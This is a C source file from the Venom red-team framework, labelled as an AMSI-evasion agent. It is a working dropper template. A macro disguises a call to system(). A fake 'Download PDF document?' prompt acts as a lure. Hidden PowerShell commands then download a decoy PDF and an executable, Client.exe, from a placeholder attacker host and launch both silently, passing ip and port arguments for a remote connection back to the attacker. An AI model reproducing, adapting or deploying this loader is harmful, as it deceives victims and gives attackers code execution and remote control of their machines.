/*
Author: r00t-3xp10it (SSA RedTeam @2020)
Framework: Venom v1.0.17 - Amsi Evasion - Agent nº 5
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>
#define _____(d,y,i,o,q,h)(i##d##h##y##o##q)
#define _ _____(y,t,s,e,m,s)

int main()
{
    MessageBox(NULL, "Download PDF document?", "FiLNaMe.pdf", MB_OK);
   _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.pdf', 'TempDir\\FiLNaMe.pdf') && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\FiLNaMe.pdf'");Sleep(1);
   _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/Client.exe', 'TempDir\\Client.exe') && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\Client.exe' -ArgumentList 'ip=LhOsT','port=LpOrT'");
   return 0;
}
